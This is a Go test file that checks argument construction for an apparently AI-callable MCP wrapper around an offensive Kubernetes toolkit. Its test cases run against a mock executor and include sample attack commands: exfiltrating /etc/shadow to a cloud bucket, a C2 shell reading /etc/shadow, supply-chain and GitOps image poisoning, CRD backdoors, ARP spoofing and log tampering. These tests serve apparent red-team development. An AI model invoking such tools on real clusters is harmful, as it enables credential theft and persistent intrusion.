			wantArgs: []string{"pcap-blind", "--hide-ports", "4444", "--hide-ips", "10.0.0.1,10.0.0.2"},
		},
		{
			name:     "polymorph",
			params:   map[string]any{"seed": "abcd1234"},
			wantArgs: []string{"polymorph", "--seed", "abcd1234"},
		},
		{
			name:     "fileless_exec",
			params:   map[string]any{"payload": "/tmp/implant.elf", "fake_name": "[kworker/0:1]"},
			wantArgs: []string{"fileless-exec", "--payload", "/tmp/implant.elf", "--fake-name", "[kworker/0:1]"},
		},
		{
			name:     "supply_chain",
			params:   map[string]any{"mode": "manifest-replace", "target_image": "nginx:latest", "payload": "evil/nginx:latest"},
			wantArgs: []string{"supply-chain", "--mode", "manifest-replace", "--target-image", "nginx:latest", "--payload", "evil/nginx:latest"},
		},
		{
			name:     "gitops_poison",
			params:   map[string]any{"repo": "https://git.example.com/org/deploys", "target_path": "k8s/deploy.yaml", "inject_image": "evil/img:latest"},
			wantArgs: []string{"gitops-poison", "--repo", "https://git.example.com/org/deploys", "--target-path", "k8s/deploy.yaml", "--inject-image", "evil/img:latest"},
		},
		{
			name:     "sig_bypass",
			params:   map[string]any{"mode": "disable-verify", "target_image": "nginx:latest"},
			wantArgs: []string{"sig-bypass", "--mode", "disable-verify", "--target-image", "nginx:latest"},
		},
		{
			name:     "crd_backdoor",
			params:   map[string]any{"action": "trigger", "crd_name": "monitoring.internal"},
			wantArgs: []string{"crd-backdoor", "--action", "trigger", "--crd-name", "monitoring.internal"},
		},
		{
			name:     "tls_intercept",
			params:   map[string]any{"action": "dump", "pid": 1234, "lib": "gnutls"},
			wantArgs: []string{"tls-intercept", "--action", "dump", "--pid", "1234", "--lib", "gnutls"},
		},
		{
			name:     "cri_tamper",
			params:   map[string]any{"runtime": "crio", "mode": "env-inject", "target_image": "nginx:latest", "inject_binary": "/tmp/impl"},
			wantArgs: []string{"cri-tamper", "--runtime", "crio", "--mode", "env-inject", "--target-image", "nginx:latest", "--inject-binary", "/tmp/impl"},
		},
		{
			name:     "webhook",
			params:   map[string]any{"action": "deploy", "namespace": "kube-system", "image": "evil/webhook:latest"},
			wantArgs: []string{"webhook", "--action", "deploy", "--namespace", "kube-system", "--image", "evil/webhook:latest"},
		},
		{
			name:     "daemonset",
			params:   map[string]any{"action": "status", "image": "evil/ds:latest", "name": "kube-node-monitor"},
			wantArgs: []string{"daemonset", "--action", "status", "--image", "evil/ds:latest", "--name", "kube-node-monitor"},
		},
		{
			name:     "sidecar_inject",
			params:   map[string]any{"pod": "api-0", "image": "evil/sidecar:latest", "namespace": "prod"},
			wantArgs: []string{"sidecar-inject", "--pod", "api-0", "--image", "evil/sidecar:latest", "--namespace", "prod"},
		},
		{
			name:     "veth_hijack",
			params:   map[string]any{"source_pod": "api-0", "dest_pod": "db-0", "mode": "redirect"},
			wantArgs: []string{"veth-hijack", "--source-pod", "api-0", "--dest-pod", "db-0", "--mode", "redirect"},
		},
		{
			name:     "kubelet",
			params:   map[string]any{"action": "exec", "node": "node1", "pod": "api-0", "cmd": "id"},
			wantArgs: []string{"kubelet", "--action", "exec", "--node", "node1", "--pod", "api-0", "--cmd", "id"},
		},
		{
			name:     "arp_spoof",
			params:   map[string]any{"victim_ip": "10.0.0.5", "gateway_ip": "10.0.0.1", "interface": "eth0"},
			wantArgs: []string{"arp-spoof", "--victim-ip", "10.0.0.5", "--gateway-ip", "10.0.0.1", "--interface", "eth0"},
		},
		{
			name:     "covert_channel",
			params:   map[string]any{"type": "ipid", "dest": "10.0.0.9", "data": "hello"},
			wantArgs: []string{"covert-channel", "--type", "ipid", "--dest", "10.0.0.9", "--data", "hello"},
		},
		{
			name:     "netbypass",
			params:   map[string]any{"mode": "encap", "dest_ip": "10.0.0.9", "dest_port": 8443},
			wantArgs: []string{"netbypass", "--mode", "encap", "--dest-ip", "10.0.0.9", "--dest-port", "8443"},
		},
		{
			name:     "meshbypass",
			params:   map[string]any{"mode": "spoof-identity", "mesh_target": "svc-api"},
			wantArgs: []string{"meshbypass", "--mode", "spoof-identity", "--mesh-target", "svc-api"},
		},
		{
			name:     "obs_poison",
			params:   map[string]any{"poison_target": "otel", "endpoint": "http://otel:4317", "strategy": "replay"},
			wantArgs: []string{"obs-poison", "--poison-target", "otel", "--endpoint", "http://otel:4317", "--strategy", "replay"},
		},
		{
			name:     "honeypot_detect",
			params:   map[string]any{"checks": "kubelet"},
			wantArgs: []string{"honeypot-detect", "--checks", "kubelet"},
		},
		{
			name:     "cloud_exfil",
			params:   map[string]any{"provider": "gcp", "bucket": "exfil-bucket", "path": "/etc/shadow", "creds_from": "env"},
			wantArgs: []string{"cloud", "exfil", "--provider", "gcp", "--bucket", "exfil-bucket", "--path", "/etc/shadow", "--creds-from", "env"},
		},
		{
			name:      "network_scan_invalid_ip",
			params:    map[string]any{"ip": "not-an-ip", "port": "80"},
			wantError: true,
		},
		{
			name:      "arp_spoof_invalid_ip",
			params:    map[string]any{"victim_ip": "999.999.1.1", "gateway_ip": "10.0.0.1"},
			wantError: true,
		},
		{
			name:      "tcp_stego_bad_dest",
			params:    map[string]any{"dest": "not-ip-port"},
			wantError: true,
		},
		{
			name:      "fault_inject_bad_pids",
			params:    map[string]any{"target_pids": "12,x"},
			wantError: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mock := executor.NewMock()
			// Tools hold their own executor, so instantiate a fresh one wired
			// to this test's mock.
			tool := toolWithMock(t, tc.name, mock)

			result, err := tool.Execute(context.Background(), mustJSON(tc.params))
			if err != nil {
				t.Fatalf("unexpected Go error: %v", err)
			}
			if tc.wantError {
				if !result.IsError {
					t.Fatalf("expected validation error, got success")
				}
				return
			}
			if result.IsError {
				t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
			}

			call := mock.LastCall()
			if call.Binary != "kubedagger-client" {
				t.Errorf("expected binary kubedagger-client, got %q", call.Binary)
			}
			assertExactArgs(t, call.Args, tc.wantArgs...)
		})
	}
}

// toolWithMock returns a fresh instance of the tool named by the test case,
// wired to the given mock executor. It mirrors the constructor mapping in
// allTools so table tests can assert exact args per tool.
func toolWithMock(t *testing.T, name string, mock executor.Executor) mcp.Tool {
	t.Helper()
	constructors := map[string]func(executor.Executor) mcp.Tool{
		"sa_token_mint":           func(e executor.Executor) mcp.Tool { return NewSAToken(e) },
		"k8s_abuse":               func(e executor.Executor) mcp.Tool { return NewK8sAbuse(e) },
		"vap_backdoor":            func(e executor.Executor) mcp.Tool { return NewVAPBackdoor(e) },
		"xdp_shell":               func(e executor.Executor) mcp.Tool { return NewXDPShell(e) },
		"bpf_ipc":                 func(e executor.Executor) mcp.Tool { return NewBPFIPC(e) },
		"k8s_event_c2":            func(e executor.Executor) mcp.Tool { return NewK8sEventC2(e) },
		"container_log_c2":        func(e executor.Executor) mcp.Tool { return NewContainerLogC2(e) },
		"doh_c2":                  func(e executor.Executor) mcp.Tool { return NewDoHC2(e) },
		"tcp_stego":               func(e executor.Executor) mcp.Tool { return NewTCPStego(e) },
		"etcd_steal":              func(e executor.Executor) mcp.Tool { return NewEtcdSteal(e) },
		"keyring":                 func(e executor.Executor) mcp.Tool { return NewKeyring(e) },
		"keyring_mitm":            func(e executor.Executor) mcp.Tool { return NewKeyringMITM(e) },
		"pod_identity":            func(e executor.Executor) mcp.Tool { return NewPodIdentity(e) },
		"sched_starve":            func(e executor.Executor) mcp.Tool { return NewSchedStarve(e) },
		"fault_inject":            func(e executor.Executor) mcp.Tool { return NewFaultInject(e) },
		"cgroup_manip":            func(e executor.Executor) mcp.Tool { return NewCgroupManip(e) },
		"election_disrupt":        func(e executor.Executor) mcp.Tool { return NewElectionDisrupt(e) },
		"cert_sabotage":           func(e executor.Executor) mcp.Tool { return NewCertSabotage(e) },
		"coredump_suppress":       func(e executor.Executor) mcp.Tool { return NewCoredumpSuppress(e) },
		"timeskew":                func(e executor.Executor) mcp.Tool { return NewTimeskew(e) },
		"log_tamper":              func(e executor.Executor) mcp.Tool { return NewLogTamper(e) },
		"syscall_bypass":          func(e executor.Executor) mcp.Tool { return NewSyscallBypass(e) },
		"audit_filter":            func(e executor.Executor) mcp.Tool { return NewAuditFilter(e) },
		"pcap_blind":              func(e executor.Executor) mcp.Tool { return NewPcapBlind(e) },
		"polymorph":               func(e executor.Executor) mcp.Tool { return NewPolymorph(e) },
		"fileless_exec":           func(e executor.Executor) mcp.Tool { return NewFilelessExec(e) },
		"supply_chain":            func(e executor.Executor) mcp.Tool { return NewSupplyChain(e) },
		"gitops_poison":           func(e executor.Executor) mcp.Tool { return NewGitOpsPoison(e) },
		"sig_bypass":              func(e executor.Executor) mcp.Tool { return NewSigBypass(e) },
		"crd_backdoor":            func(e executor.Executor) mcp.Tool { return NewCRDBackdoor(e) },
		"tls_intercept":           func(e executor.Executor) mcp.Tool { return NewTLSIntercept(e) },
		"cri_tamper":              func(e executor.Executor) mcp.Tool { return NewCRITamper(e) },
		"webhook":                 func(e executor.Executor) mcp.Tool { return NewWebhook(e) },
		"daemonset":               func(e executor.Executor) mcp.Tool { return NewDaemonset(e) },
		"sidecar_inject":          func(e executor.Executor) mcp.Tool { return NewSidecarInject(e) },
		"veth_hijack":             func(e executor.Executor) mcp.Tool { return NewVethHijack(e) },
		"kubelet":                 func(e executor.Executor) mcp.Tool { return NewKubelet(e) },
		"arp_spoof":               func(e executor.Executor) mcp.Tool { return NewARPSpoof(e) },
		"covert_channel":          func(e executor.Executor) mcp.Tool { return NewCovertChannel(e) },
		"netbypass":               func(e executor.Executor) mcp.Tool { return NewNetBypass(e) },
		"meshbypass":              func(e executor.Executor) mcp.Tool { return NewMeshBypass(e) },
		"obs_poison":              func(e executor.Executor) mcp.Tool { return NewObsPoison(e) },
		"honeypot_detect":         func(e executor.Executor) mcp.Tool { return NewHoneypotDetect(e) },
		"cloud_exfil":             func(e executor.Executor) mcp.Tool { return NewCloudExfil(e) },
		"network_scan_invalid_ip": func(e executor.Executor) mcp.Tool { return NewNetworkScan(e) },
		"arp_spoof_invalid_ip":    func(e executor.Executor) mcp.Tool { return NewARPSpoof(e) },
		"tcp_stego_bad_dest":      func(e executor.Executor) mcp.Tool { return NewTCPStego(e) },
		"fault_inject_bad_pids":   func(e executor.Executor) mcp.Tool { return NewFaultInject(e) },
	}
	constructor, ok := constructors[name]
	if !ok {
		t.Fatalf("no constructor mapping for test case %q", name)
	}
	return constructor(mock)
}

// ---------------------------------------------------------------------------
// Test: Operator tools use global flags before positional commands
// ---------------------------------------------------------------------------

func TestOperatorTools_ArgConstruction(t *testing.T) {
	t.Run("agents", func(t *testing.T) {
		mock := executor.NewMock()
		tool := NewOperatorAgents(mock)
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{"key": "testkey"}))
		if err != nil || result.IsError {
			t.Fatalf("unexpected error: %v / %s", err, result.Content[0].Text)
		}
		call := mock.LastCall()
		if call.Binary != "kubedagger-operator" {
			t.Errorf("expected binary kubedagger-operator, got %q", call.Binary)
		}
		assertExactArgs(t, call.Args, "-key", "testkey", "-addr", "127.0.0.1:9443", "agents")
	})

	t.Run("shell", func(t *testing.T) {
		mock := executor.NewMock()
		tool := NewOperatorShell(mock)
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
			"key": "testkey", "agent_id": "agent-1", "command": "cat /etc/shadow",
		}))
		if err != nil || result.IsError {
			t.Fatalf("unexpected error: %v / %s", err, result.Content[0].Text)
		}
		call := mock.LastCall()
		assertExactArgs(t, call.Args, "-key", "testkey", "-addr", "127.0.0.1:9443", "shell", "agent-1", "cat /etc/shadow")
	})

	t.Run("module", func(t *testing.T) {
		mock := executor.NewMock()
		tool := NewOperatorModule(mock)
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
			"key": "testkey", "agent_id": "agent-1", "module": "net-sniff", "config": "mode=stealth rate=50",
		}))
		if err != nil || result.IsError {
			t.Fatalf("unexpected error: %v / %s", err, result.Content[0].Text)
		}
		call := mock.LastCall()
		assertExactArgs(t, call.Args, "-key", "testkey", "-addr", "127.0.0.1:9443", "module", "agent-1", "net-sniff", "mode=stealth", "rate=50")
	})

	t.Run("tasks_list", func(t *testing.T) {
		mock := executor.NewMock()
		tool := NewOperatorTasks(mock)
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
			"key": "testkey", "action": "list", "agent_id": "agent-1",
		}))
		if err != nil || result.IsError {
			t.Fatalf("unexpected error: %v / %s", err, result.Content[0].Text)
		}
		call := mock.LastCall()
		assertExactArgs(t, call.Args, "-key", "testkey", "-addr", "127.0.0.1:9443", "tasks", "agent-1")
	})

	t.Run("tasks_status_uses_status_command", func(t *testing.T) {
		mock := executor.NewMock()
		tool := NewOperatorTasks(mock)
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
			"key": "testkey", "action": "status", "task_id": "task-42",
		}))
		if err != nil || result.IsError {
			t.Fatalf("unexpected error: %v / %s", err, result.Content[0].Text)
		}
		call := mock.LastCall()
		assertExactArgs(t, call.Args, "-key", "testkey", "-addr", "127.0.0.1:9443", "status", "task-42")
	})

	t.Run("operator_status_tool", func(t *testing.T) {
		mock := executor.NewMock()
		tool := NewOperatorStatus(mock)
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
			"key": "testkey", "task_id": "task-42",
		}))
		if err != nil || result.IsError {
			t.Fatalf("unexpected error: %v / %s", err, result.Content[0].Text)
		}
		call := mock.LastCall()
		assertExactArgs(t, call.Args, "-key", "testkey", "-addr", "127.0.0.1:9443", "status", "task-42")
	})

	t.Run("custom_addr", func(t *testing.T) {
		mock := executor.NewMock()
		tool := NewOperatorAgents(mock)
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
			"key": "testkey", "addr": "10.0.0.5:9443",
		}))
		if err != nil || result.IsError {
			t.Fatalf("unexpected error: %v / %s", err, result.Content[0].Text)
		}
		call := mock.LastCall()
		assertExactArgs(t, call.Args, "-key", "testkey", "-addr", "10.0.0.5:9443", "agents")
	})

	t.Run("key_from_env", func(t *testing.T) {
		t.Setenv("KUBEDAGGER_OPERATOR_KEY", "envkey")
		mock := executor.NewMock()
		tool := NewOperatorAgents(mock)
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{}))
		if err != nil || result.IsError {
			t.Fatalf("unexpected error: %v / %s", err, result.Content[0].Text)
		}
		call := mock.LastCall()
		assertExactArgs(t, call.Args, "-key", "envkey", "-addr", "127.0.0.1:9443", "agents")
	})

	t.Run("missing_key_rejected", func(t *testing.T) {
		t.Setenv("KUBEDAGGER_OPERATOR_KEY", "")
		tool := NewOperatorAgents(executor.NewMock())
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{}))
		if err != nil {
			t.Fatalf("unexpected Go error: %v", err)
		}
		if !result.IsError {
			t.Fatal("expected error when key is missing")
		}
		if !strings.Contains(result.Content[0].Text, "KUBEDAGGER_OPERATOR_KEY") {
			t.Errorf("expected env var hint in error, got: %s", result.Content[0].Text)
		}
	})

	t.Run("tasks_missing_agent_id", func(t *testing.T) {
		tool := NewOperatorTasks(executor.NewMock())
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
			"key": "testkey", "action": "list",
		}))
		if err != nil {
			t.Fatalf("unexpected Go error: %v", err)
		}
		if !result.IsError {
			t.Error("expected error for list without agent_id")
		}
	})

	t.Run("tasks_missing_task_id", func(t *testing.T) {
		tool := NewOperatorTasks(executor.NewMock())
		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
			"key": "testkey", "action": "status",
		}))
		if err != nil {
			t.Fatalf("unexpected Go error: %v", err)
		}
		if !result.IsError {
			t.Error("expected error for status without task_id")
		}
	})
}

// ---------------------------------------------------------------------------
// Test: New tools build correct args
// ---------------------------------------------------------------------------

// asTool adapts a concrete tool constructor to the mcp.Tool interface so it
// can be stored in test tables.
func asTool[T mcp.Tool](fn func(executor.Executor) T) func(executor.Executor) mcp.Tool {
	return func(e executor.Executor) mcp.Tool { return fn(e) }
}

func TestNewTools_ArgConstruction(t *testing.T) {
	tests := []struct {
		name     string
		tool     func(executor.Executor) mcp.Tool
		params   map[string]any
		wantArgs []string
	}{
		{
			name:     "fs_watch_add",
			tool:     asTool(NewFSWatch),
			params:   map[string]any{"action": "add", "path": "/etc/passwd", "in_container": true, "active": true},
			wantArgs: []string{"fs_watch", "add", "/etc/passwd", "--in-container", "--active"},
		},
		{
			name:     "fs_watch_delete",
			tool:     asTool(NewFSWatch),
			params:   map[string]any{"action": "delete", "path": "/etc/passwd"},
			wantArgs: []string{"fs_watch", "delete", "/etc/passwd"},
		},
		{
			name:     "fs_watch_get",
			tool:     asTool(NewFSWatch),
			params:   map[string]any{"action": "get", "path": "/etc/passwd"},
			wantArgs: []string{"fs_watch", "get", "/etc/passwd"},
		},
		{
			name:     "pipe_prog_put",
			tool:     asTool(NewPipeProg),
			params:   map[string]any{"action": "put", "program": "/tmp/prog", "from": "src", "to": "dst", "backup": true},
			wantArgs: []string{"pipe_prog", "put", "/tmp/prog", "--from", "src", "--to", "dst", "--backup"},
		},
		{
			name:     "pipe_prog_delete",
			tool:     asTool(NewPipeProg),
			params:   map[string]any{"action": "delete", "from": "src", "to": "dst"},
			wantArgs: []string{"pipe_prog", "delete", "--from", "src", "--to", "dst"},
		},
		{
			name:     "postgres_list",
			tool:     asTool(NewPostgres),
			params:   map[string]any{"action": "list"},
			wantArgs: []string{"postgres", "list"},
		},
		{
			name:     "postgres_put",
			tool:     asTool(NewPostgres),
			params:   map[string]any{"action": "put", "role": "admin", "secret": "s3cr3t"},
			wantArgs: []string{"postgres", "put", "--role", "admin", "--secret", "s3cr3t"},
		},
		{
			name:     "postgres_delete",
			tool:     asTool(NewPostgres),
			params:   map[string]any{"action": "delete", "role": "admin"},
			wantArgs: []string{"postgres", "delete", "--role", "admin"},
		},
		{
			name:     "proctree",
			tool:     asTool(NewProctree),
			params:   map[string]any{},
			wantArgs: []string{"proctree", "get"},
		},
		{
			name:     "mitre_export",
			tool:     asTool(NewMITREExport),
			params:   map[string]any{"format": "markdown"},
			wantArgs: []string{"mitre", "export", "--format", "markdown"},
		},
		{
			name:     "detection_list",
			tool:     asTool(NewDetection),
			params:   map[string]any{"action": "list"},
			wantArgs: []string{"detection", "list"},
		},
		{
			name:     "detection_generate",
			tool:     asTool(NewDetection),
			params:   map[string]any{"action": "generate", "techniques": "T1613,T1610", "out": "/tmp/rules.md"},
			wantArgs: []string{"detection", "generate", "--techniques", "T1613,T1610", "--out", "/tmp/rules.md"},
		},
		{
			name:     "report_generate",
			tool:     asTool(NewReport),
			params:   map[string]any{"events": "/tmp/events.jsonl", "html": true, "title": "Engagement Report", "operator": "red", "client": "blue", "start": "2026-01-01", "end": "2026-02-01", "scope": "cluster-wide"},
			wantArgs: []string{"report", "generate", "--events", "/tmp/events.jsonl", "--html", "--title", "Engagement Report", "--operator", "red", "--client", "blue", "--start", "2026-01-01", "--end", "2026-02-01", "--scope", "cluster-wide"},
		},
		{
			name:     "report_generate_minimal",
			tool:     asTool(NewReport),
			params:   map[string]any{"events": "/tmp/events.jsonl"},
			wantArgs: []string{"report", "generate", "--events", "/tmp/events.jsonl"},
		},
		{
			name:     "vap_backdoor",
			tool:     asTool(NewVAPBackdoor),
			params:   map[string]any{"namespace": "kube-system", "label": "backdoor=true", "kubeconfig": "/tmp/kc", "token": "tok"},
			wantArgs: []string{"vap_backdoor", "--namespace", "kube-system", "--label", "backdoor=true", "--kubeconfig", "/tmp/kc", "--token", "tok"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mock := executor.NewMock()
			tool := tc.tool(mock)

			result, err := tool.Execute(context.Background(), mustJSON(tc.params))
			if err != nil {
				t.Fatalf("unexpected Go error: %v", err)
			}
			if result.IsError {
				t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
			}

			call := mock.LastCall()
			if call.Binary != "kubedagger-client" {
				t.Errorf("expected binary kubedagger-client, got %q", call.Binary)
			}
			assertExactArgs(t, call.Args, tc.wantArgs...)
		})
	}
}

func TestNewTools_Validation(t *testing.T) {
	tests := []struct {
		name   string
		tool   mcp.Tool
		params map[string]any
	}{
		{"fs_watch_missing_path", NewFSWatch(executor.NewMock()), map[string]any{"action": "add"}},
		{"fs_watch_bad_action", NewFSWatch(executor.NewMock()), map[string]any{"action": "explode", "path": "/tmp"}},
		{"pipe_prog_missing_program", NewPipeProg(executor.NewMock()), map[string]any{"action": "put"}},
		{"pipe_prog_underscore_program", NewPipeProg(executor.NewMock()), map[string]any{"action": "put", "program": "/tmp/bad_prog"}},
		{"pipe_prog_from_too_long", NewPipeProg(executor.NewMock()), map[string]any{"action": "put", "program": "/tmp/p", "from": strings.Repeat("a", 17)}},
		{"pipe_prog_hash_in_to", NewPipeProg(executor.NewMock()), map[string]any{"action": "put", "program": "/tmp/p", "to": "a#b"}},
		{"postgres_missing_role", NewPostgres(executor.NewMock()), map[string]any{"action": "put"}},
		{"postgres_bad_action", NewPostgres(executor.NewMock()), map[string]any{"action": "drop"}},
		{"report_missing_events", NewReport(executor.NewMock()), map[string]any{}},
		{"detection_bad_action", NewDetection(executor.NewMock()), map[string]any{"action": "remove"}},
		{"vap_backdoor_bad_namespace", NewVAPBackdoor(executor.NewMock()), map[string]any{"namespace": "BAD_NS"}},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result, err := tc.tool.Execute(context.Background(), mustJSON(tc.params))
			if err != nil {
				t.Fatalf("unexpected Go error: %v", err)
			}
			if !result.IsError {
				t.Errorf("expected validation error, got success")
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

type mockError struct {
	msg string
}

func (e *mockError) Error() string { return e.msg }

// assertExactArgs asserts that args equals want exactly, in order.
func assertExactArgs(t *testing.T, args []string, want ...string) {
	t.Helper()
	if !reflect.DeepEqual(args, want) {
		t.Errorf("expected exact args %v, got %v", want, args)
	}
}

// charLabel returns a readable label for metacharacters used in test names.
func charLabel(c string) string {
	labels := map[string]string{
		";":  "semicolon",
		"|":  "pipe",
		"&":  "ampersand",
		"`":  "backtick",
		"$":  "dollar",
		"(":  "lparen",
		")":  "rparen",
		"{":  "lbrace",
		"}":  "rbrace",
		"<":  "lt",
		">":  "gt",
		"!":  "bang",
		"'":  "squote",
		"\"": "dquote",
		"\\": "backslash",
		"\n": "newline",
		"\r": "carriage_return",
	}
	if l, ok := labels[c]; ok {
		return l
	}
	return c
}
